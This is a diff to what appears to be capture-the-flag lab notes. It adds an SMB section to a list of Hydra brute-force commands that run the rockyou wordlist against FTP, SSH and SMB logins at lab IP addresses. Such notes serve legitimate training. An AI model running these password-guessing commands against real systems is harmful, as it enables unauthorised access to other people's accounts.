@@ -46,3 +46,8 @@ hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.173.92 ftp
 ```
 hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.252.105 -t 4 ssh
 ```
+
+## SMB
+```
+hydra -l jon -P /usr/share/wordlists/rockyou.txt 10.10.95.216 smb -t 40
+```
